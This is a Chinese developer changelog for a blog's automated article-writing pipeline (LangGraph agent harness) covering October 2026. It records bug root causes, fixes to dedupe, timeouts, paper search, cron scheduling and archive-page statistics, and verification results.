**根因**：热度是 `Numeric(5,2)` 类型，总热度累加后是 `53632.82`——带小数点且 8 字符，直接撑出统计卡。单条热度是 0-100（如 `"96.00"`），同样带无意义小数。

**修法**：`utils/helpers.ts` 新增 `formatCompactNumber`（全站统一，不各页重复造）：

| 区间 | 输出 |
|---|---|
| < 10000 | 整数 + 千分位（`9,999`） |
| ≥ 10000 | `53.6K` |
| ≥ 100万 | `1.5M` |
| ≥ 10亿 | `2.5B` |

去尾随 0（`1K` 不是 `1.0K`）；`null`/`undefined`/非数字 → `0`。

**改动点（4 处显示）**：
- `Archives.tsx`：顶部"热度"统计卡 + 热点列表每条热度
- `HotspotDetail.tsx`：徽章 `热度 60` + 数据格

**溢出防护**：统计卡加 `min-w-0` + `tabular-nums` + `truncate` + 响应式字号（`text-xl sm:text-2xl`），数值再长也不会撑破卡片；`title` 属性保留完整值便于悬停查看。

**验证**：单测 16/16（含 `9999.9→10,000`、`null/abc→0` 边界）；浏览器实测归档页热度卡 `53632.82 → 53.6K`，`scrollWidth > clientWidth` 检测为 `false`（不溢出）；热点列表页全为整数、无小数点、无 6 位以上裸数字。

## 二十七期：规划层丢标题致空转 + 归档页统计不随 tab 变化（2026-10-15，提交 `670f169`，生产镜像 `qianxi-blog:ci-43`）

千禧两条："按照你说的顺序进行相关修复""归档页上面显示的文章/标签/阅读数量不会因为下方筛选而变化，是个固定死的值，需要修复"。

### 10-15 09:20 空转 1 小时+ 的根因（四层防御补齐）
失败链：规划层返回的计划有个小问题（第 8 节 target_chars=300 <500）→ `_repair_plan` 让 LLM 修一次 → **模型吐出的 JSON 缺 title/slug** → 因为 JSON 解析成功、不走 except 分支，**`_coerce_plan` 没被调用** → 缺字段带病下行 → 结构闸"标题 0 字"反复失败 → 自动回炉后又撞同一个坑（同一条线索稳定复现）。

四层防御：
- `_repair_plan` 的修复结果也过 `_coerce_plan`（先合并非空字段再裁剪）
- `_coerce_plan` 补"缺 title 时从 goal/首节标题派生"
- **结构闸新增空标题硬拦**（以前只判长度，`len("")=0` 被放过——这是漏洞关键：空标题本不该通过）
- 汇总层 `assemble` 再兜一道（缺 title/slug 时派生）

验证：补跑 #684 一次过——规划层**零校验错误**、标题 19 字（不再是 0）、审稿 93 分 pass。

### 归档页统计不随 tab 变化（前端 bug）
根因：`archiveStats` 只从 `articles` 计算，完全不看 `activeTab`——切到热点/AI 日报时三个数字纹丝不动（等于给了个错的数）。
修法：新增 `headerStats`，按 tab 出各自口径：

| Tab | 卡片 |
|---|---|
| 文章 | 篇数 / 有文章的标签数 / 总阅读 |
| 热点 | 已发布热点数 / 打标主题数 / 总热度 |
| AI 日报 | 日报条目数 / 主题数 / 覆盖月数 |

数据未加载时显示 `…`，不显示上一 tab 的旧值（避免误导）。
浏览器实测三个 tab：`23/7/13341` → `572/10/53632.82` → `333/5/2`。

### 其他
- pending 残留 16 个文件全部归档清空（`archive/pub-cleanup-20261015-021325/`）
- 注意：CI 重建容器会杀正在跑的流水线，**残留的 `.run.lock` 不会自动清**，需手动 `docker exec qianxi-blog rm -f /data/pipeline/.run.lock`

## 二十六期：超时余量 + rework 回炉救稿 + 重复稿清理（2026-10-14，提交 `f6c2f2d`，生产镜像 `qianxi-blog:ci-42`）

千禧四条："670/671 只保留一篇（你对比，我偏好技术细节）""工具循环超限——写作本来就是慢活，每个阶段超时多预留点时间""失败稿看看能不能重新修补后再发布""pending 残留清掉，再手动触发一次看看"。

### 670/671 去重：留 #671（技术细节更密）
对比后按千禧"偏技术细节"的口味留 #671：#671 中文字数 7400（#670 是 6702）、mermaid 2 个（#670 只 1 个）、量化证据更多（28.1% off-target flag、17,600 项未授权操作）、多出 CyberGym-E2E 基准机制细节（PoC/patch 四阶段验证、allowlist 文件、`--no-firewall` 逃生开关）、机制刻画到 WebDAV 协议级与目标泛化形式化（O′=O+λ·E）。#670 的追责讨论更多但技术密度低。#670 已删（全量备份 `/data/blog/data/pipeline/backup/hot_topic_670_deleted_20261014-055412.json`，含 sources 表 8 条，可回滚）。

### 超时：写作是慢活，多留余量
- **`_llm` timeout 900s → 1500s**（25 分钟）：规划层一次 fetch_paper 就几十万字符、章节层一次吐 800-1000 字技术正文，step-5-preview 在 step_plan 渠道实测单次 2-5 分钟不罕见，900s 偶发 `read operation timed out` 打挂整轮
- **规划层**：单轮调用预算 6 → 8（读论文 + 留足发言轮）；新增超时容错——超时不再立即 raise，累计 3 次才判定该轮废，期间 20s 退避重试
- **章节层 `_llm_with_retry`**：attempts 5 → 6，新增超时分支（以前超时走到 `break` 直接放弃该节 = 整篇缺一块），超时与 429 同样 10s×n 退避
- 1500s 仍远小于 cron 间隔（3.5 小时），不会挤掉下一轮

### rework 回炉：链路原本整个是断的
用户要"失败稿修补后再发布"，查出三个相继的断点（一层修完露下一层）：
1. `run_harness` 的 initial state 有 `rework_file` 字段但**代码从不使用**——传进去被无视，白跑完整选题流程
2. harness 图没有 START 分支，永远从 `plan` 起跑 → 补 `_route_entry`（rework_file + draft_md 非空直进 `check` 结构闸）
3. `_execute` 的 `use_harness` 分支**没把 rework_file 传给 run_harness** → API 侧也补透传（`/run` 与 `/cron` 共用 `_execute`，一处修两条路通）
4. 回炉稿没有 plan（无章节可分包），闸/审稿打回时只能整篇修 → 新增 `rework_fix` 节点复用老图 `write`；check/review 路由在回炉模式走 `rework_fix` 而非 `sections`

**三篇失败稿全部救回并发布**：

| 原 id | 标题 | 审稿分 | 修复点 |
|---|---|---|---|
| #678 | 长上下文推理的 KV 层级：自适应驻留与投机验证 | **93** | 只差 queue_slot（内容本就 90 分，一票否决项） |
| #679 | 预训练数据顺序如何塑造模型的知识更新效率 | **90** | 引用格式问题 |
| #680 | 评分模型破坏环境触发重置 | **95** | 3840 → 6000 字（rework_fix 整篇扩写一轮过闸） |

### 其他
- pending 残留 2 篇（#676/#677 已发布但队列没清）归档清掉
- failed 队列清空（三篇移 `archive/reworked-20261014/` 留痕）
- 手动触发验证通过：#681《MultiAlloc 把 KV 量化变成预算分配问题》6952 字、审稿 88 pass
- published 总数 568

## 二十五期：多源论文检索 + 动态字数（硬底 4500）（2026-10-14，提交 `12092d1`，生产镜像 `qianxi-blog:ci-39`）

千禧三问："为什么会检索不到论文？要不加个 MCP？""是不是字数要求太强硬导致一直达不到？加个根据选题动态调整长度，但最少不要低于 4500 字。"

### 检索不到论文：不是缺 MCP，是出口 IP 被 arXiv 限流
实测（服务器 `101.32.163.17`）：
- `export.arxiv.org/api/query` 持续 **429 `Rate exceeded.`**，等 60s、换 `arxiv.org/api` 主站都不恢复；
- 但 **`arxiv.org/html/<id>` 全文仍 200**（770KB）——只有列表 API 被限，读论文不受影响；
- `_get` 原来只捕 `TransportError`，429 是正常 HTTP 响应不触发重试，被外层吞成"检索失败"。

**修法：多源降级 `search_papers_multi`（实测定序）**
| 顺位 | 源 | 关键点 |
|---|---|---|
| 1 | arXiv API | 有 429/503 指数退避（3s/6s） |
| 2 | **OpenAlex** | 必须 `locations.source.id:S4306400194`（arXiv 源）+ `title_and_abstract.search`；裸 `search=` 会捞进社会学论文（查 "LLM agent tool use" 返回 "Employee Creativity"）。限定后结果纯是 arXiv 论文，且 DOI `10.48550/arxiv.<id>` 能可靠反解 arXiv ID——规划层要靠它读全文 |
| 3 | HuggingFace daily_papers | **不接受查询词**（实测两次不同查询返回完全相同结果），只配当"至少给一批真实新论文"的兜底 |

### 动态字数：固定 6000 是"反复回修到 failed"的元凶
数据（近 60 篇）：中位数 6260、均值 6349、**27 篇 <6000**、最短 2592——说明固定 6000 线让"选题本就撑不到 6000"的稿子反复回修直到超轮。
- 规划层按选题丰度自定 `target_chars`（5000-8000），程序只守 **4500 硬底**（千禧要求）
- 校验"声明目标 vs 各节加总"一致（差 >15% 报错），避免两边口径打架
- 未达动态目标但高于硬底 → 只记 log 交审稿，不再触发整篇重写
- 配套：章节字数自检 60% → 85%（见二十四期），单节就写够

**实测效果**：#677 一次通过——7/7 章节、**8295 字**（此前固定线时反复卡 5990-6386）、审稿 86 分 pass。

### 推图床幂等（顺带修的真 bug）
#677 的 3 张论文图推送失败，日志 `nothing to commit, working tree clean`：同一批图重推时，上次若 commit 成功但 push 失败，这次 `git add` 后无变化，`check=True` 的 `git commit` 非零退出被当成失败——**图永远上不去（raw URL 404）**。
改为先 `git diff --cached --quiet` 判断：有差异才 commit；无差异直接 push（推的正是上次那个 commit）。
实测：把 `_failed` 里积压的 **12 个 manifest 全部重推成功**，`_done` 21 个、`_failed` 清空；fig1/fig2/fig3 raw URL 全 200。

## 二十四期：治撞题——去重清单落窗 + 锚点论文硬闸 + 规划层循环修复（2026-10-14，提交 `9821a23`，生产镜像 `qianxi-blog:ci-36`）

用户报障："如果是和已经发布的重叠重合重复的，清理删除掉；解决一下撞题冲突的问题，让 AI 在选题的时候先把近 5 天的文章标题给他，让他防止重复选题，优化整个 agent 链路"。

### 撞题的三个叠加根因（都修了）
1. **`run_harness` 被定义两次**（harness.py 第 395 行与第 445 行），后者覆盖前者——而后者直接用调用方传入的 `recent_titles`，API/cron 从不传参 → **去重清单长期是空字符串**。删掉重复定义，只留带自查的一版。这是"喂了标题也没用"的真根因。
2. **清单取法错**：原按 `id desc limit 10`；改 `topic_date` 落窗更糟——`topic_date` 是十八期均摊出来的**排期日期**（有 10-31 等未来值），按它过滤取到的全是"排期在未来"的旧文，真正这两天写的反而漏掉。最终定在 **`created_at`**（真实写作时间），窗口 5 天、上限 40 篇。
3. **只给标题判不动**：`负载自适应的 KV 分层驻留` vs `长上下文推理的 KV 层级` 是同一件事，纯标题看不出。改为**标题 + 摘要**（摘要截 80 字），并新增两道硬闸：
   - `used_arxiv_ids_for_dedupe()`：从 `hot_topic_sources` 抽近 5 天用过的锚点论文 ID（含队列存稿），`validate_plan(plan, used_ids)` 撞上直接判死；
   - `plan_article` 检索结果里**预先剔除**已写过的论文（从源头减少模型撞题机会）。
   - 撞题不走 `_repair_plan`（实测模型只会改标题措辞、锚点还是那篇），而是**重新选题**并明确告知"上次那篇写过了"。

### 今天 09:20 hot 任务失败的根因
`ValueError: 规划层未产出合法计划（工具循环超限）`——`planner.py` 每轮模型调用预算只有 4 次，而"读主锚 + 辅助论文"本身要消耗轮次，模型把 4 轮全花在读论文上，**没有一轮用来吐 JSON**。改为每轮 6 次，且重试轮不再重读论文：把已读材料注入下一轮 + 明确要求"不要再调工具，直接输出 JSON"。

### 其他
- cron 文件曾因追加 watcher 时漏换行触发 `Missing newline before EOF, this crontab file will be ignored`，导致 10-13 的 09:20 任务没跑（已修，现 11 行、以换行结尾）。
- 清理了 pending 里 5 篇与已发布重复的稿（移到 `hotspot_queue/archive/dup-cleanup-20261014/` 留痕，不直接删）；failed 保留 3 篇不重复的失败稿。
- 实测：去重清单 = 近 5 天已发布 6 篇（带摘要）+ 队列 3 篇；锚点论文 ID 7 个。

## 二十三期：agent harness——规划→章节并发→汇总→回检（2026-10-13，提交 `0c61c52`，生产镜像 `qianxi-blog:ci-34`）

千禧拍板："做成真正的 agent harness：先确认目标/todolist → 搜资料确认选题 → 确认标题 → 分章节 → 每节派 subagent → 收集组合 → 回检复核；langgraph + deepagent，配 tool/skills，检索以论文为主"。决策：先 LangGraph 原生 fan-out（deepagents 已验证可装 0.7.24，暂缓）；配图上传 GitHub 图床（`qianxi-00/My_image`）+ 论文原图搬运 + mermaid 兜底；选题 arXiv/paper 为主、AIHOT 只做补充。

### 新模块（`backend/app/services/hotspot_pipeline/`）
- **`paper_tools.py`**：`search_papers`（arXiv API，https-only）/ `fetch_paper`（arXiv HTML 全文 → 章节结构 + 按 caption 关键词打分的候选配图）/ `stage_figures`（≤6 张、拒 <2000B，落地 `/data/pipeline/figures`，rel 形如 `blog/images/<yyyy-mm>/<slug>/`）/ `push_figures`（宿主 git push 图床，容器无 git）
- **`planner.py`**：`PLANNER_SYSTEM_PROMPT` 产出 JSON 计划（goal/todolist/title/slug/summary/分类/锚点论文/sections[{heading,purpose,target_chars,key_points,figure}]）；`plan_article` 包 `fetch_paper` 为 @tool，≤4 次工具调用 × 2 轮；`validate_plan` 校验标题 ≤32、slug、4-8 节、单节 ≥500、总字数 ≥6000、mermaid ≤4、**末节必须是结论节**
- **`writer.py`**：章节并发 fan-out，`MAX_CONCURRENT_SECTIONS=2`（stepfun 通道硬限 5，3 会 429）+ 10s×attempt 指数退避 5 次 + 失败章节串行补写
- **`harness.py`**：LangGraph 节点 `plan→sections→assemble→check→review→enqueue→publish`（+retry/failed）；`_inject_figures` 替换 `<!-- FIGURE: cap -->` 占位符 → 写 manifest → 宿主钩子 `/data/blog/scripts/push_figures.sh` 推图床；`_route_harness_check/_route_harness_review` 适配老路由的 `"write"` 返回值；dedupe 上下文走 `_PLAN_CTX`（LangGraph 不许未知 key）
- **`graph.py`**：`PipelineState` 加 `plan`/`section_results`；`_extract_json` 兜底 `_repair_json_quotes`（中文弯引号在字符串内 → 崩溃修复）；`review` 429 退避、不可用时降级 `verdict=revise` 不炸 run；`recent_titles_for_dedupe` 抽出复用（老图去重不丢）

### 实测闭环（发布 #674《ReplaySSM 用输入重放替代 SSM 状态缓存》）
- 论文 arXiv 2610.13778 → 规划 9 条 todolist / 8 节（26 字标题）→ 8/8 章节 → 8490 汉字 → 结构闸通过 → **审稿 95 分 pass** → 入队 → 发布；前端复验 8 个 mermaid 全渲染 0 Syntax error、表格 1 个、结论节+参考资料齐
- 对比老流水线：一次过 vs 老图 4 稿才达线（4169→5052→5781→6100）
- 首轮实测揪出并修复的真缺陷：①审稿一票否决缺 `queue_slot` frontmatter → `assemble` 补上；②三轮连续扣"缺独立结论段落" → planner 规则 #7 + `validate_plan` 末节必检；③列了不引用的来源比不列更糟 → `_plan_sources` 只列正文真引用的；④修复轮 LLM 把论文原文吐回来当"修复结果" JSON 炸 → 修复 prompt 剥离 `_paper_material` + `_coerce_plan` 程序兜底（标题截 32/尾节并入/slug 兜底）不再带违规计划下行；⑤第 5 图 `x_{t+1}` 未加引号花括号 → 前端 Syntax error，闸补检查 + #674 就地修复
- 接线：`/run` 与 `/cron` 都收 `use_harness`（默认 false 老流水线可回退）；cron wrapper 第 4 参 `1` = harness，`/etc/cron.d/hotspot-pipeline` 三条任务已切 harness（cron reload 验证过）

### 关键教训
- **CI 重建容器会清掉 `docker cp` 的临时代码**——验证完必须提交入库再验，否则镜像里是旧的（本轮 tools.py 踩过一次）
- 容器无 git、`docker exec` 无 stdin：图床推送走宿主钩子脚本，heredoc 一律先写文件再 `docker cp`
- 宿主侧直调 `publish` 节点需先 `import app.main` 装配 ORM mapper，否则报 `Article is not defined`

## 二十二期：选题学术技术化 + 标题长度治理（2026-10-12，提交 `ebb9682`，生产镜像 `qianxi-blog:ci-30`）

千禧两条拍板："选题要学术/技术，不要 AI 日报那种资讯——不值得浪费 token""标题在详情页太长太大了"。

### 选题学术技术化（TOPIC_PICK_PROMPT 重写）
- 硬方向：论文成果与机制解读 / 模型架构与训练方法 / 推理优化与部署工程 / 基础设施与工具链 / 有技术拆解价值的开源项目
- 拒绝：产品发布新闻 / 融资与行业动态 / 榜单 / 纯事件转述
- 检验标准：能否支撑"原理拆解 + 机制对比 + 工程含义"三段深度——不能就换候选；池里全资讯时挖背后的技术点选题
- curriculum prompt 顺手修复插入条目后的编号错乱

### 标题长度治理（生成侧 + 程序闸 + 前端三层）
- 写作 prompt：≤28 字、禁"主标题：副标题补充"双段结构、附 22 字好例与 41 字反例
- **程序闸 4**：MAX_TITLE_CHARS=32（可计算指标代码判；28-32 灰色区交审稿清单新增第 9 项）
- 前端 HotspotDetail 标题自适应：≤22 字 `text-3xl md:text-4xl` bold 保冲击力；>22 字降档 `text-2xl md:text-3xl` + leading-snug——旧 text-5xl font-black（48px/900/5 行）是资讯流内容用了文章头版字号
- 生产实测：65 字符长标题 48px→30px、900→700、5 行→3 行；17 字短标题 36px 不变；mermaid 渲染无恙（svg 2 / 失败框 0）

## 二十一期：loop 闭环——failed 自动回炉 + 字数浮动 6000 + rework 模式（2026-10-12，提交 `edc8a66`，生产镜像 `qianxi-blog:ci-29`）

千禧拍板："failed 之后不能就这么没了，要返工""字数上下浮动 500""该修的 bug 迅速修"。

### loop 闭环（graph.py）
- **retry 节点**：结构闸/审稿超轮不再终态落盘——清盘（topic/sources/draft/轮次）自动回选题重跑一次（retry_used 防无限循环；rework 模式除外）。重跑走全新链而非拿死稿硬磨（实测同稿反复扩写每轮只涨 500-1500 字）
- **字数线 6500 → 6000 下限**（锚 6500，6000-7000 均可）：step-5-preview 首稿 4500-6300、连续 6 稿 6500 达标率 0% 的实测下，硬线超轮 failed 率过高；6336/5823 这类稿子新线下直接达标或一轮回修即过
- 结构闸 3 → 4 轮
- **rework 模式**：`run_pipeline(rework_file=)` + API `rework_file` 字段——拿存量稿直进结构闸（START 条件路由），闸过审稿即发布、闸不过带缺口指令扩写回修

### bug 修复（api/hotspot_pipeline.py）
- **单飞锁改文件锁** `/data/pipeline/.run.lock`（O_CREAT|O_EXCL 原子抢占 + 30 分钟死锁豁免 + finally 释放）——2 workers 各持内存 _RUNS，内存单飞实测失效（21:20 cron 与手动 run 并发双跑）
- **查重双源**：近 10 篇 published + pending/failed 队列存稿标题（`_queue_titles`）——ExploitGym 同题 5+ 变体堆积的根治
- **curriculum 选题禁写当下新闻事件/事故复盘**（防热点池污染知识线——21:20 的 curriculum-2000 run 实测被 ExploitGym 带跑）

### 回炉实测（当天两篇全成功）
1. incident-review 7570 字 → 闸过 → 审稿 pass 88 → **发布 #671**
2. anthropic-admits 6891 字 → 闸过 → 审稿 **revise 75 分（不过）→ 自动回修 → 7015 字 → pass 95 分 → 发布 #672**——完整闭环活证据：审稿不过不是没了，是回炉重造直到达标
- 前端验收：#/hotspots/671 **2 个 mermaid 渲染成 SVG、零失败框**、八段大纲、来源 6 个；热点面板 10 月 70→73
- 同题冗余归档：auto/security-analysis/postmortem/新冒 2 篇变体 → `hotspot_queue/archive/2026-10-12/`

### 遗留观察
- **同题双发待处置**：#670（"当安全测试成为威胁"，21:20 curriculum 被污染跑出的同题稿）与 #671 同题——建议删 670 留 671（底稿在 archive/ 可回炉重发），等千禧拍板
- 查重是标题级（LLM 比对），"当安全测试成为威胁" vs "ExploitGym 逃逸全景复盘"字面不同但主题相同——后续可加 slug 关键词匹配或让选题 LLM 明确标注"是否与清单中某条同主题"
- 明天 09:20/19:20/21:20 三时点 cron 用新逻辑首跑，观察：新字数线下首稿达标率、retry 触发率、curriculum 是否还追热点

## 二十期：每日 3 篇 cron 化 + 审稿分数程序门槛（2026-10-11，提交见本节末，生产走 CI/CD）

千禧拍板"每天 3 篇，确保写作质量"。

### 定时与发布
- `/etc/cron.d/hotspot-pipeline` 三时间点：`20 9` hot（当日热点）/ `20 19` curriculum-1900（注意力·KV Cache·推理加速线）/ `20 21` curriculum-2000（预训练·数据·scaling law 线），沿袭 openclaw 早追热点晚学体系节奏；`publish=true` 直接发布，三层质量闸（结构程序闸/审稿 85 分线/failed 兜底）不过绝不发布。
- 触发走 wrapper：`/data/blog/scripts/trigger_hotspot_pipeline.sh <mode> <track_slot> <publish>`，key **现读** `/data/blog/runtime.env` 的 `PIPELINE_CRON_KEY`，绝不落 cron 文件；日志 `hotspot-pipeline-cron.log`。
- 端点 `POST /api/v1/hotspot-pipeline/cron`：`PIPELINE_CRON_KEY` 鉴权（未配置则全拒），running 冲突 409（cron 下个时间点再来），其余与 `/run` 同逻辑。

### 质量门槛（发布权交给程序，不交给 LLM 自觉）
- `graph.py`：`MIN_REVIEW_SCORE = 85`——verdict=pass 但 score<85 一律强制转 revise（notes 头插【程序门槛】），回修上限 2 轮、超限 failed 待人工；`review_score` 入 PipelineState。
- `prompts.py` 审稿提示词同步打分锚定四档（92-100/85-91/70-84/<70）+"放行空泛内容=审稿失职"约束。

### 二十期踩坑（全部实测）
1. **FastAPI 裸 str 参数按 query 解析**：`x_cron_key: str` 收不到 `x-cron-key` 请求头，实测 422 `"loc":["query","x_cron_key"]`——必须 `Header(...)`（convert_underscores 默认映射 x-cron-key）。初版部署后 wrapper 实测当场暴露。
2. **cron 环境变量行不剥引号**：`KEY_CMD='curl…'` 单引号成字面量传给 job——初版 cron 写法作废，改为 cron 行只调 wrapper。
3. **relay 链 force-push**：二十期 commit 在服务器 `/data/blog/repo-tmp`（remote `relay`）做出并强推 origin，覆盖了 9-28 relay 链旧头（`4ecc5bf` docs / `a09d81a` style）。核实两 commit 内容均已含在当前链（表格 `min-w-[920px]` 在 UserAdminPanels.tsx:452），无实质丢失；本地与 origin/master 历史不同源（513 文件大迁移所致），cherry-pick 会满屏 AA，勿再尝试。
4. **API 层相对导入层级错一个点（致命，POST /run 与 /cron 自十九期起恒废）**：`hotspot_pipeline.py`（app/api/v1/ 下）写 `from ..services.hotspot_pipeline import run_pipeline`——`..` 解析到 `app.api.services`（不存在），ModuleNotFoundError 是 ImportError 子类被 try/except 吞成 `run_pipeline = None`，运行时秒挂 `'NoneType' object is not callable` 且 stdout 零痕迹（_execute 吞异常）。三个连环教训：① `app/api/v1/` 回 app 根要三个点 `...`；② 吞 ImportError 必须把 `_PIPELINE_IMPORT_ERROR` 暴露到端点响应/日志，否则错误被推到第一次调用；③ `_execute` 的 except 必须 `traceback.print_exc()`，asyncio.create_task 的静默失败是运维黑洞。定位路径：手写 HS256 JWT 打 /runs 拿 record detail（多 worker 各持内存 _RUNS，GET 多打几次）→ 容器内 PYTHONPATH=/app 直跑 run_pipeline 全绿排除代码问题 → print_exc 全栈指向 None 的 import。

### 部署与验证
- CI/CD `c4f9d25`（21:28 success）已上生产；服务器侧 runtime.env key + wrapper + cron 由接手会话（ZCode）补完（DSH 会话在写完部署脚本后被掐停，`b_fix_cron20.sh` 未及执行）。
- 实测四步：wrapper 就位 / cron 重写 3 行 / publish=false 真实触发 / 错 key 拒绝。

## 十九期：热点文章流水线 LangGraph 重建（2026-10-11，提交 `ffaa1d3`，生产镜像 `qianxi-blog:manual-pipe19`）

openclaw cron 的热点写作/推送（7 月随 openclaw 退役停摆）按千禧规格在博客内重建。

### 管线（backend/app/services/hotspot_pipeline/，LangGraph StateGraph 9 节点）
```
选题(AIHOT当日池+近10篇查重/知识线课程) → 资料检索(工具循环：search_github/
search_arxiv/fetch_url/search_aihot 多源+空资料三层防线) → 写作(八段结构/
6500字/mermaid图+表格/官方-社区-推断三层事实分层) → 结构闸(mermaid白名单+
表格+字数三重程序闸) → 审稿(必须/加分/一票否决清单) → 入队(.md+.meta.json
原版双文件结构, /data/blog/data/pipeline/hotspot_queue/{pending,failed}/)
→ 发布(publish=true 时 service 层直建 hot_topics+sources+topic_tag)
```
- 端点：`POST /api/v1/hotspot-pipeline/run`（super_admin，单飞锁，asyncio 后台任务）+ `GET /hotspot-pipeline/runs`；body `{"mode":"hot|curriculum","track_slot":"1900","publish":false}`
- 模型：step-5-preview @ stepfun step_plan 渠道，PIPELINE_* 独立 env（runtime.env 注入，不进 git；不占 A-RAG 的 grok 链路）；_llm() 显式断言拒绝静默 fallback 到 OPENAI_API_KEY（实测 ChatOpenAI api_key=None 会拿 grok key 打 stepfun → 401 误导）
- 配图：mermaid（千禧拍板替代图床）——前端 MermaidChart 渲染链验证 + 白名单图型校验 + 失败兜底代码框
- 提示词复原自 OPENCLAW-BLOG-CRON-TASKS.md（含 10-10 二次挖掘的晚间提示词逐字原文/校验脚本源码）

### dry-run 三轮实测教训（已全部修复）
1. 审稿 LLM 放水（5368 字打 93 分 pass）→ 硬指标全部程序闸判定
2. 结构闸/审稿共池预算冤杀稿件 → 分池（structure_round 3 轮 + revision_round 2 轮）
3. 工具满限后总结 LLM 输出空 sources → 二次强约束 + ToolMessage 程序化 URL 兜底
4. 终态：ExploitGym 逃逸事件复盘 7570 汉字 / 6 份一手资料 / 2 个 mermaid / 审稿 92 分入队

### deploy_backend.sh 根修（runtime.env 增量合并）
容器 env 是自我延续设计（docker inspect 继承）——往 runtime.env 加新键永远进不去容器
（PIPELINE_* 三键实测漏掉）。部署时继承容器现值后把 runtime.env 里的缺键补入：
runtime.env 成为可增键单一来源，已有键以容器为准。本次手动部署补入 3 键。

### 待办
- cron 触发频率未定（等千禧拍板：openclaw 原版每天 10 写 + 10 发，恢复节奏建议从每天 1-2 篇起步）
- stepfun key 已进过对话记录，建议控制台轮换
- pending/ 里有一篇 ExploitGym 复盘稿 + failed/ 里两篇试验稿，人工看过后决定是否发布

## 十八期：热点日期均摊 3-10 月 + 静态快照退役（2026-10-10，提交 `4a9ec1b`，生产镜像 `qianxi-blog:ci-22`）

用户拍板：558 个热点挤在 03-07 月（05 月 202、08-10 月全空），均摊到 3-10 月。

### 数据操作（可回滚双保险：全库备份 + 映射 CSV）
- redate_hotspots.py：558 个 published 按原序线性铺 2026-03-01~10-31（245 天，i*245//n），topic_date 新分布 71/68/71/68/71/71/68/70；映射 CSV /data/blog/logs/hotspot-redate-*.csv
- redate_published_at.py：**时段面板按 published_at 分组**（HotspotsList getPublishedDate 优先级 published_at>topic_date），只改 topic_date 面板不动——按同一 CSV 把 published_at 日期部分同步（保留原时刻）
- 备份 /data/blog/backup/before-hotsdate-*.db（改前）

### 根因修复："热点好久没更新"的另一半
- 热点页优先吃静态快照 dist/data/hotspots-published.json——**2026-07-09 的一次性产物**（"HF backend snapshot"，grep 全仓无生成链路），DB 之后的一切更新页面都看不到
- 第一次尝试改名退役不够：nginx SPA fallback 对缺失 json 返回 **200+HTML**（非 404），且 fetch(cache:'default') 浏览器缓存命中照样吃旧 JSON——面板数字纹丝不动
- 终修：**快照链路彻底删除**（fetchHotspotSnapshot/HOTSPOT_SNAPSHOT_PATH/HotspotSnapshot 类型），数据源 = API 全量分页（HOTSPOT_FETCH_PAGE_SIZE 20→100，558 条 6 次请求秒级）
- 生产实测：时段面板 3-10 月全部 68-71 个、列表卡片正常渲染

### 踩坑
- nginx SPA fallback 让"删静态文件"≠404——任何依赖静态 json 存在性的前端逻辑都要防 200+HTML
- fetch cache:'default' 的磁盘缓存硬刷（reload(true)）不清洗——数据源切换宁可删路径不要留 fallback

## 十七期 review 批（2026-10-10，提交 `19cbb2d`，生产镜像 `qianxi-blog:ci-20`）

自审十七期发现三处，全部修复：

- **P1 名实不符（真 bug）**：build_topics 每组截 30 条，前端按钮却写"查看该主题全部 N 条"——展开永远只有 30 条。去掉截断（30 天全量 319 条 / 179KB gzip 后 ~40KB 可接受），生产实测最大组"技巧与观点"展开真 85 条。
- **P2 机制缺口**：新发布热点 topic_tag 为 NULL 会一直落"未分类"（打标脚本纯手动）。装 /etc/cron.d/hotspot-tagging——每天 03:17 幂等补标，无新热点时 0 条秒退零成本。
- **P3 a11y**：四处折叠组头补 aria-expanded。

数据链路备注：topics.json 重建在服务器直接写 dist（fetch 脚本），repo 的 public/data 每次同步副本。

## 十七期：归档主题组可折叠 + 日报双视图（2026-10-10，提交 `e5d3e85`，生产镜像 `qianxi-blog:ci-19`）

用户实测反馈两点：① 热点/日报主题组要能"全部收起"（十六期永远露 8 条预览没法整组收）② AI 日报也要能按日期看。

- **主题组整组折叠**：组头整行可点（chevron+名+计数），默认全部收起——纯索引态（热点 10 行组头/日报 5 行组头）；点开见 8 条预览+"查看全部"二级展开；实测收起 0 行 → 点开 8 行 → 再点回归 0 行全链通
- **AI 日报双视图**：「按主题（默认）/ 按日期」切换与热点同款语言；日期视图为月份折叠 + 日历格深链 `#/ai-daily?p=`（十五期交互回归，十六期纯主题把日期入口删过头）；dailyIndex 由挂载探针顺带拉好，两种视图即点即得
- 折叠态模型：组折叠（openHotspotThemes/openDailyTopicGroups，默认空）与"查看全部"二级展开（expandedHotspotGroups/expandedDailyTopics）分离互不干扰

## 十六期：归档主题化 + AI 日报滚动 30 天 + LLM 热点打标（2026-10-10，提交 `4543da5`，生产镜像 `qianxi-blog:ci-18`）

用户拍板：AIHOT 源头只开放 30 天历史（/dailies 列表实测 2026-09-11→10-10），6-8 月补不了——本地同样滚动 30 天；归档页只按主题组织；热点打标借助系统 AIAgent。

### AI 日报滚动 30 天
- fetch_ai_daily.py 加 prune_old_dailies：cron 每 30 分钟无条件滚动清理（304 未更新也清）；6-8 月零散旧档删除，index/topics 无条件重建。新增 build_topics：按 section.label 聚合生成 ai-daily-topics.json（实测 319 条/5 组：技巧与观点 85、产品发布 72、行业动态 68、模型发布 64、论文研究 30）
- 顺手回填 AIHOT 窗口内缺的 13 天（backfill_daily.py 一次性，9-11→9-23），9 月完整
- 数据链路澄清：生产数据源是 dist/data（/etc/cron.d/blog-ai-daily 每 30 分钟直写，deploy_frontend.sh L42 保留 data 目录）；repo 的 public/data 仅快照，已对齐生产态

### 热点 LLM 打标（558/558 全量完成）
- hot_topics 加 topic_tag 列；tag_hotspots.py 容器内跑 grok-4.7（系统同款 new-api 链路），10 主题词表归一——primary_category 中英混杂不可用（"AI基础设施"90 vs "AI-Infrastructure"33）
- 分布：研究论文 134/推理与部署 90/Agent与工具 82/多模态 70/安全与对齐 66/行业与商业 39/开源生态 31/模型发布 18/编程实践 16/其他 12；幂等可增量补新热点

### 归档页主题化
- 热点默认主题视图 + "按时间"切换（月折叠+月内 8 条截断展开）；tab 计数挂载即拉（修复"几个点"）
- AI 日报纯主题视图（topics.json，条目直达源文）

### AiDaily 补漏
- 简报条目标题整条可点源文；"返回最新日报"→"回到今天"（已是最新时禁用置灰）；?p= 深链加载后自动滚到简报区；零内容日（如 10-05）空态卡

### 踩坑
- **手动序列化漏带新列**：HotTopicListItem schema 加了字段但 _to_list_item/_to_detail 手动构造没传——主题分组全落"未分类"。教训：**加 DB 列三件套 = ALTER + model + schema + 所有手动构造点**。
